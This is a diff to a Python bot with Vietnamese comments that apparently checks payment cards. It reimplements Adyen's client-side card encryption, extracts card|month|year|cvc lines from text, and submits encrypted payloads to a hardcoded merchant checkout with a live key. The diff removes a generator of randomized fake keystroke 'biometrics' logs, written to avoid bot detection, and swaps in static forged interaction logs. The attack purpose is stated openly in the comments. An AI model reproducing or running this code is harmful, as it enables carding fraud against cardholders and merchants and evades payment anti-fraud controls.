@@ -113,22 +113,26 @@ def is_user_allowed(user_id):
     return user_id in users
 
 # ===================================================================
-# === PHẦN 1: THUẬT TOÁN MÃ HÓA ADYEN 4.8.0
+# === PHẦN 1: THUẬT TOÁN MÃ HÓA ADYEN 4.8.0 (FROM TESSTTTT2.py)
 # ===================================================================
 
 def get_current_timestamp():
+    """Tạo timestamp theo định dạng ISO 8601 UTC."""
     return datetime.utcnow().isoformat() + 'Z'
 
 def w(e):
+    """Mã hóa base64 một chuỗi hoặc bytes."""
     t = e
     if isinstance(t, str):
         t = t.encode('utf-8')
     return base64.b64encode(t).decode('utf-8')
 
 def _(e):
+    """Mã hóa base64 URL-safe."""
     return w(e).replace('=', '').replace('+', '-').replace('/', '_')
 
 def k(e):
+    """Chuyển đổi chuỗi hex thành bytearray."""
     if not e:
         return bytearray(0)
     if len(e) % 2 == 1:
@@ -142,6 +146,7 @@ def k(e):
 bt = 2**32
 
 def mt(e, t, r):
+    """Ghi một số nguyên 32-bit vào bytearray."""
     if not (0 <= t < bt):
         raise ValueError(f"value must be >= 0 and <= {bt - 1}. Received {t}")
     e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]
@@ -152,13 +157,17 @@ class AdyenV4_8_0:
         self.key_object = None
 
     def generate_key(self):
+        """Tạo đối tượng khóa RSA từ Adyen public key."""
         parts = self.site_key.split("|")
         if len(parts) != 2:
-            raise ValueError("Malformed public key")
+            raise ValueError("Malformed public key: incorrect split parts")
+        
         part1 = parts[0]
         part2 = parts[1]
+        
         decoded_part1 = k(part1)
         decoded_part2 = k(part2)
+
         encoded_part1 = _(decoded_part1)
         encoded_part2 = _(decoded_part2)
 
@@ -172,127 +181,79 @@ class AdyenV4_8_0:
         return self.key_object
 
     def encrypt_data(self, plain_text):
+        """Mã hóa dữ liệu sử dụng Adyen's CSE."""
         public_key = jwk.construct(self.key_object)
         pem = public_key.to_pem().decode('utf-8')
         rsa_key = RSA.import_key(pem)
+
         random_bytes = os.urandom(64)
+        
         cipher_rsa = PKCS1_OAEP.new(rsa_key)
         encrypted_key = cipher_rsa.encrypt(random_bytes)
+        
         cek = random_bytes
+        
         protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
         protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
+        
         _iv = os.urandom(16)
         _plaintext = json.dumps(plain_text).encode('utf-8')
+        
         aes_key = cek[32:]
         hmac_key = cek[:32]
+        
         cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
         padded_plaintext = pad(_plaintext, AES.block_size)
         ciphertext = cipher_aes.encrypt(padded_plaintext)
+        
         protected_header2_bytes = protected_header_b64.encode('utf-8')
+        
         f = len(protected_header2_bytes) * 8
         d = f // bt
         h_val = f % bt
         y = bytearray(8)
         mt(y, d, 0)
         mt(y, h_val, 4)
+
         hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
         hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
         tag = hmac_obj.digest()[:32]
+
         return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"
 
 def format_card_number(card):
+    """Định dạng số thẻ có dấu cách."""
     return ' '.join(card[i:i+4] for i in range(0, len(card), 4))
 
-def generate_fake_adyen_log(input_length):
-    """
-    CẢI TIẾN: Tạo chuỗi log Behavior Biometrics giả lập hành vi người dùng thật.
-    Tránh dùng log tĩnh để không bị phát hiện là Bot.
-    """
-    # Random thời gian bắt đầu load trang (từ 5s đến 15s trước khi nhập)
-    base_time = random.randint(5000, 15000) 
-    log_parts = []
-    
-    # 1. Focus (fo) - Người dùng nhấp vào ô input
-    base_time += random.randint(200, 800)
-    log_parts.append(f"fo@{base_time}")
-    
-    # 2. Click (cl) - Sự kiện click xảy ra ngay sau focus
-    base_time += random.randint(10, 100)
-    log_parts.append(f"cl@{base_time}")
-    
-    # 3. KeyDown (KN) - Mô phỏng gõ từng ký tự với tốc độ biến thiên
-    for _ in range(input_length):
-        # Tốc độ gõ trung bình của người: 80ms - 250ms giữa các phím
-        # Có thể thêm delay ngẫu nhiên lớn hơn để mô phỏng sự khựng lại
-        delay = random.randint(80, 250)
-        if random.random() < 0.1: # 10% cơ hội ngừng lại suy nghĩ
-             delay += random.randint(200, 500)
-             
-        base_time += delay
-        log_parts.append(f"KN@{base_time}")
-        
-    # 4. Blur (bl) - Người dùng bấm ra ngoài hoặc chuyển tab (Tab key)
-    # Thường có 1 khoảng ngưng sau khi gõ xong
-    base_time += random.randint(300, 1000)
-    log_parts.append(f"bl@{base_time}") 
-    
-    return ",".join(log_parts)
-
 def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
-    if not stripe_key: stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
-    if not domain: domain = "https://taongafarm.com"
+    """Chuẩn bị và mã hóa dữ liệu thẻ cho Adyen v4.8.0 (Logic từ TESSTTTT2.py)."""
+    if not all([card, month, year, cvc, adyen_key]):
+        raise ValueError("Missing card details or Adyen key")
+
+    if not stripe_key:
+        stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU" # Default fallback
+    if not domain:
+        domain = "https://taongafarm.com"
+        
     domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
     referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.3/securedFields.html?type=card&d={domain_b64}"
     
-    card_number_fmt = format_card_number(card)
-    
-    # --- TẠO LOG BEHAVIOR ĐỘNG (IMPROVED) ---
-    # Log cho trường thẻ (16-19 số)
-    card_log = generate_fake_adyen_log(len(card))
-    # Log cho CVC (3-4 số)
-    cvc_log = generate_fake_adyen_log(len(str(cvc)))
-    
+    card_number = format_card_number(card)
+
     card_detail = {
-        "encryptedCardNumber": {
-            "number": card_number_fmt, 
-            "generationtime": get_current_timestamp(), 
-            "numberBind": "1", 
-            "activate": "3", 
-            "referrer": referrer, 
-            "numberFieldFocusCount": "1", 
-            "numberFieldLog": card_log, # Dynamic Log
-            "numberFieldClickCount": "1", 
-            "numberFieldKeyCount": str(len(card)),
-            "numberFieldBlurCount": "1"
-        },
-        "encryptedExpiryMonth": {
-            "expiryMonth": month, 
-            "generationtime": get_current_timestamp()
-        },
-        "encryptedExpiryYear": {
-            "expiryYear": year, 
-            "generationtime": get_current_timestamp()
-        },
-        "encryptedSecurityCode": {
-            "cvc": cvc, 
-            "generationtime": get_current_timestamp(), 
-            "cvcBind": "1", 
-            "activate": "4", 
-            "referrer": referrer, 
-            "cvcFieldFocusCount": "1", 
-            "cvcFieldLog": cvc_log, # Dynamic Log
-            "cvcFieldClickCount": "1", 
-            "cvcFieldKeyCount": str(len(str(cvc))), 
-            "cvcFieldChangeCount": "1", 
-            "cvcFieldBlurCount": "1", 
-            "deactivate": "2"
-        }
+        "encryptedCardNumber": {"number": card_number, "generationtime": get_current_timestamp(), "numberBind": "1", "activate": "3", "referrer": referrer, "numberFieldFocusCount": "3", "numberFieldLog": "fo@44070,cl@44071,KN@44082,fo@44324,cl@44325,cl@44333,KN@44346,KN@44347,KN@44348,KN@44350,KN@44351,KN@44353,KN@44354,KN@44355,KN@44356,KN@44358,fo@44431,cl@44432,KN@44434,KN@44436,KN@44438,KN@44440,KN@44440", "numberFieldClickCount": "4", "numberFieldKeyCount": "16"},
+        "encryptedExpiryMonth": {"expiryMonth": month, "generationtime": get_current_timestamp()},
+        "encryptedExpiryYear": {"expiryYear": year, "generationtime": get_current_timestamp()},
+        "encryptedSecurityCode": {"cvc": cvc, "generationtime": get_current_timestamp(), "cvcBind": "1", "activate": "4", "referrer": referrer, "cvcFieldFocusCount": "4", "cvcFieldLog": "fo@122,cl@123,KN@136,KN@138,KN@140,fo@11204,cl@11205,ch@11221,bl@11221,fo@33384,bl@33384,fo@50318,cl@50319,cl@50321,KN@50334,KN@50336,KN@50336", "cvcFieldClickCount": "4", "cvcFieldKeyCount": "6", "cvcFieldChangeCount": "1", "cvcFieldBlurCount": "2", "deactivate": "2"}
     }
+
     adyen_encryptor = AdyenV4_8_0(adyen_key)
     adyen_encryptor.generate_key()
+    
     encrypted_details = {}
     for key, value in card_detail.items():
         encrypted_details[key] = adyen_encryptor.encrypt_data(value)
+        
     return encrypted_details
 
 # ===================================================================
@@ -301,7 +262,6 @@ def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, do
 
 def normalize_card(card_str):
     # Cập nhật Regex chặt chẽ hơn: chỉ chấp nhận phân cách | / : ; - hoặc khoảng trắng
-    # Tránh bắt nhầm các đoạn text khác
     pattern = r'(\d{13,19})[\s|/;:.-]+(\d{1,2})[\s|/;:.-]+(\d{2,4})[\s|/;:.-]+(\d{3,4})'
     match = re.search(pattern, card_str)
     
@@ -337,7 +297,6 @@ def extract_cards_from_text(text):
     lines = text.splitlines()
     
     # Regex chặt chẽ: Card + (Separators) + Month + ...
-    # [\s|/;:.-]+ nghĩa là 1 hoặc nhiều ký tự phân cách (space, |, /, :, ;, ., -)
     pattern_strict = r'(\d{13,19})[\s|/;:.-]+(\d{1,2})[\s|/;:.-]+(\d{2,4})[\s|/;:.-]+(\d{3,4})'
     
     for line in lines:
@@ -535,7 +494,7 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id):
                     retry_count += 1
                     continue
 
-                # --- BƯỚC 3: MÃ HÓA (Đã cập nhật logic fake log động) ---
+                # --- BƯỚC 3: MÃ HÓA (Đã update từ TESSTTTT2.py) ---
                 encrypted_data = encrypt_card_data_480(cc, mm, yyyy, cvc, ADYEN_KEY, STRIPE_KEY, DOMAIN_URL)
 
                 # --- BƯỚC 4: THANH TOÁN ---
